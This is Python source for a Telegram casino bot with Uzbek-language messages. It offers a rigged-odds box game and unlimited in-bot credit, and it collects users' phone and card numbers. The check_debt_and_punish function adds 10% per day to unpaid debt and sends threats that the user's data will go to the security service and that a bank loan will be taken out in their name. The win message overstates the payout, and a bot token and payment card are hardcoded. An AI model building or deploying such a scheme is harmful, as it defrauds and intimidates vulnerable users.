import telebot
from telebot import types
import sqlite3
import random
from datetime import datetime

# --- KONFIGURATSIYA ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
bot = telebot.TeleBot(TOKEN, threaded=False)
ADMIN_ID = 8299021738
KARTA_RAQAM = "9860 6067 5582 9722"

# --- BAZA BILAN ISHLASH ---
def execute_query(query, params=(), is_select=False):
    conn = sqlite3.connect('casino_uzb.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute(query, params)
    if is_select:
        res = cursor.fetchone() if "LIMIT 1" in query or "WHERE id" in query else cursor.fetchall()
        conn.close()
        return res
    conn.commit()
    conn.close()

# Bazani yaratish
execute_query('''CREATE TABLE IF NOT EXISTS users 
                 (id INTEGER PRIMARY KEY, name TEXT, phone TEXT, 
                  balance REAL DEFAULT 0, debt REAL DEFAULT 0, 
                  last_debt_time TEXT, user_card TEXT DEFAULT 'Kiritilmagan')''')

# --- MENYU TIZIMI ---
def main_menu(uid):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🎰 4 ta Quticha", "👤 Profil")
    markup.add("💳 Depozit", "💸 Nasiya olish")
    markup.add("🔴 Qarzni to'lash", "💸 Pul yechish")
    if uid == ADMIN_ID:
        markup.add("📊 Admin: Ma'lumot")
    return markup

# --- JARIMA VA QATTIQ OGOHLANTIRISH ---
def check_debt_and_punish(uid):
    user = execute_query("SELECT debt, last_debt_time FROM users WHERE id=?", (uid,), is_select=True)
    if user and user[0] > 0 and user[1]:
        debt, last_time = user[0], user[1]
        last_date = datetime.strptime(last_time, "%Y-%m-%d %H:%M:%S")
        days_passed = (datetime.now() - last_date).days

        if days_passed >= 1:
            # Har bir kun uchun 10% jarima qo'shish
            interest = debt * 0.10 * days_passed
            new_debt = debt + interest
            execute_query("UPDATE users SET debt = ?, last_debt_time = ? WHERE id=?", 
                          (new_debt, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), uid))
            
            warning = (f"🚨 **SO'NGGI OGOHLANTIRISH!**\n\n"
                       f"Qarzingizni to'lamagan {days_passed} kuningiz uchun 10% jarima qo'shildi.\n"
                       f"Hozirgi qarz: **{new_debt:,} so'm**.\n\n"
                       f"⚠️ Agar 12 soat ichida to'lamasangiz:\n"
                       f"1. Ma'lumotlaringiz **DXX**ga beriladi.\n"
                       f"2. Nomizga bankdan **KREDIT** olish so'rovi yuboriladi!")
            bot.send_message(uid, warning, parse_mode="Markdown")

# --- START VA RO'YXATDAN O'TISH ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    check_debt_and_punish(uid)
    user = execute_query("SELECT * FROM users WHERE id=?", (uid,), is_select=True)
    if user:
        bot.send_message(message.chat.id, "Xush kelibsiz!", reply_markup=main_menu(uid))
    else:
        bot.send_message(message.chat.id, "Ismingizni kiriting:")
        bot.register_next_step_handler(message, get_name)

def get_name(message):
    name = message.text
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📞 Raqamni yuborish", request_contact=True))
    bot.send_message(message.chat.id, f"Rahmat {name}! Telefon raqamingizni tasdiqlang:", reply_markup=markup)
    bot.register_next_step_handler(message, save_user, name)

def save_user(message, name):
    if message.contact:
        uid, phone = message.from_user.id, message.contact.phone_number
        execute_query("INSERT OR IGNORE INTO users (id, name, phone, balance) VALUES (?, ?, ?, 5000)", (uid, name, phone))
        bot.send_message(message.chat.id, "✅ Ro'yxatdan o'tdingiz! 5,000 s bonus berildi.", reply_markup=main_menu(uid))
    else:
        bot.send_message(message.chat.id, "Tugmani bosing!")
        bot.register_next_step_handler(message, save_user, name)

# --- 4 TA QUTICHA O'YINI (YUTISH EHTIMOLI SOZLANGAN) ---
@bot.message_handler(func=lambda m: m.text == "🎰 4 ta Quticha")
def game_start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(*[types.InlineKeyboardButton(f"📦 {i}-quti", callback_data=f"box_{i}") for i in range(1, 5)])
    bot.send_message(message.chat.id, "Bitta qutini tanlang (Tikish: 5,000 s):", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("box_"))
def game_result(call):
    uid = call.from_user.id
    user = execute_query("SELECT balance FROM users WHERE id=?", (uid,), is_select=True)
    if not user or user[0] < 5000:
        bot.answer_callback_query(call.id, "Mablag' yetarli emas!", show_alert=True)
        return

    # Omad imkoniyati: 1 dan 4 gacha. Faqat 1 tushsa yutadi (25% shans).
    # Bu 3 ta yutqazib, 1 ta yutish degani.
    chance = random.randint(1, 4)
    if chance == 1:
        execute_query("UPDATE users SET balance = balance + 15000 WHERE id=?", (uid,))
        txt = "🎉 TABRIKLAYMIZ! Yutuqli qutini topdingiz! +20,000 so'm"
    else:
        execute_query("UPDATE users SET balance = balance - 5000 WHERE id=?", (uid,))
        txt = "😔 AFSUKI TOPOLMADINGIZ. Bu quti bo'sh edi."
    
    bot.edit_message_text(txt, call.message.chat.id, call.message.message_id)
    bot.send_message(call.message.chat.id, "Yana o'ynaysizmi?", reply_markup=main_menu(uid))

# --- BOSHQA FUNKSIYALAR ---
@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid = message.from_user.id
    check_debt_and_punish(uid)

    if message.text == "👤 Profil":
        u = execute_query("SELECT balance, debt, name, phone, user_card FROM users WHERE id=?", (uid,), is_select=True)
        msg = f"👤 Ism: {u[2]}\n📞 Tel: {u[3]}\n💰 Balans: {u[0]:,} s\n🔴 Qarz: {u[1]:,} s\n💳 Karta: {u[4]}"
        bot.send_message(message.chat.id, msg)

    elif message.text == "💸 Nasiya olish":
        bot.send_message(message.chat.id, "Qancha nasiya kerak?")
        bot.register_next_step_handler(message, set_debt)

    elif message.text == "💸 Pul yechish":
        u = execute_query("SELECT balance, debt FROM users WHERE id=?", (uid,), is_select=True)
        if u[1] > 0: bot.send_message(message.chat.id, "⚠️ Avval qarzni to'lang!")
        elif u[0] < 20000: bot.send_message(message.chat.id, "⚠️ Minimal yechish: 20,000 s")
        else:
            bot.send_message(message.chat.id, "Karta raqamingizni yozing:")
            bot.register_next_step_handler(message, save_withdraw_card)

    elif message.text == "📊 Admin: Ma'lumot" and uid == ADMIN_ID:
        users = execute_query("SELECT name, phone, debt, user_card FROM users", is_select=True)
        res = "📊 **Foydalanuvchilar:**\n\n"
        for u in users: res += f"👤 {u[0]} | {u[1]}\n🔴 Qarz: {u[2]:,} | 💳 K: {u[3]}\n---\n"
        bot.send_message(ADMIN_ID, res, parse_mode="Markdown")

def set_debt(message):
    try:
        amt = float(message.text)
        execute_query("UPDATE users SET balance = balance + ?, debt = debt + ?, last_debt_time = ? WHERE id=?", 
                      (amt, amt, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), message.from_user.id))
        bot.send_message(message.chat.id, f"✅ {amt:,} so'm nasiya berildi.")
    except: bot.send_message(message.chat.id, "Faqat son!")

def save_withdraw_card(message):
    card = message.text
    execute_query("UPDATE users SET user_card = ? WHERE id=?", (card, message.from_user.id))
    bot.send_message(message.chat.id, "Summani kiriting:")
    bot.register_next_step_handler(message, lambda m: bot.send_message(ADMIN_ID, f"💸 **YECHISH SO'ROVI:**\nSumma: {m.text}\nKarta: {card}\nID: {m.from_user.id}"))

bot.infinity_polling()

    
            
        
        
    
  
